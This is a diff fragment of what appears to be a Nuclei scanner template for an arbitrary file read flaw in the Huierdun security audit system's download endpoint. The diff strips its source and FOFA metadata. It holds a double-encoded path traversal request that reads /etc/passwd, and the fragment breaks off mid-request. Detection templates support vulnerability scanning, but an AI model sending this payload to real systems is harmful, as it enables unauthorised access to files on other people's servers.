@@ -3,14 +3,8 @@ info:
   name: 惠尔顿安全审计系统download任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9f42db6f18fb14918ea9f37112e759a5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9f42db6f18fb14918ea9f37112e759a5
-    fofa: + fofa`app="惠尔顿-网络安全审计系统"`
 http:
 - raw:
   - 'GET /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
